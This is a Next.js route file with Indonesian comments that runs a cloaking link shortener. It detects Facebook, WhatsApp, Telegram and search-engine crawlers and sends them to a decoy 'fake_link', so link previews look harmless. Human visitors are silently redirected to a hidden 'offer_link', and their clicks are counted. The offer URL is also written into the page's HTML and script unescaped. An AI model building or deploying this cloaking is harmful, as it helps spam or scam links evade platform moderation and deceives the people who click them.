import { turso } from "@/lib/turso";
import { NextResponse } from 'next/server';

export const dynamic = 'force-dynamic';
export const fetchCache = 'force-no-store';

export async function GET(request, { params }) {
  try {
    const resolvedParams = await params;
    const shortcode = resolvedParams.shortcode;

    // 1. Baca identitas
    const userAgent = request.headers.get('user-agent') || '';

    // 2. Deteksi Bot Sosial Media
    const isBot = /facebookexternalhit|whatsapp|telegrambot|twitterbot|googlebot|bingbot|slurp|spider/i.test(userAgent);

    // 3. Cari data link
    const result = await turso.execute({
      sql: "SELECT * FROM links WHERE short_code = ?",
      args: [shortcode]
    });

    if (result.rows.length === 0) {
      return NextResponse.redirect(new URL('/', request.url));
    }

    const data = result.rows[0];

    // ==========================================
    // LOGIKA CLOAKING (BOT VS MANUSIA)
    // ==========================================

    if (isBot) {
      // BOT FB -> Lempar pake jalur belakang (Server Redirect 302)
      // Bot FB butuh ini biar thumbnail & judul Youtube kebaca sempurna
      let fakeUrl = data.fake_link || 'google.com'; 
      if (!fakeUrl.startsWith('http')) fakeUrl = 'https://' + fakeUrl;
      
      return NextResponse.redirect(new URL(fakeUrl), { 
        status: 302, 
        headers: { 'Cache-Control': 'no-store' } 
      });
      
    } else {
      // MANUSIA (FB Biru, FB Lite, dll) -> Hitung Klik
      await turso.execute({
        sql: "UPDATE links SET click_count = click_count + 1 WHERE short_code = ?",
        args: [shortcode]
      });

      let offerUrl = data.offer_link || 'google.com';
      if (!offerUrl.startsWith('http')) offerUrl = 'https://' + offerUrl;
      
      // JURUS ANTI BLACK-SCREEN FB BIRU: JS REDIRECT
      // Kita gak pake NextResponse.redirect(). Kita kasih halaman HTML super ringan
      // yang otomatis pindah sendiri dalam 0.001 detik.
      const html = `
        <!DOCTYPE html>
        <html>
          <head>
            <meta charset="utf-8">
            <meta http-equiv="refresh" content="0;url=${offerUrl}">
            <script>
              window.location.replace("${offerUrl}");
            </script>
          </head>
          <body style="background-color: #ffffff;"></body>
        </html>
      `;

      return new NextResponse(html, {
        status: 200,
        headers: {
          'Content-Type': 'text/html',
          'Cache-Control': 'no-store, no-cache, must-revalidate, max-age=0',
        },
      });
    }

  } catch (error) {
    console.error("System Error Route:", error);
    return new NextResponse("Server Crash: " + error.message, { status: 500 });
  }
}
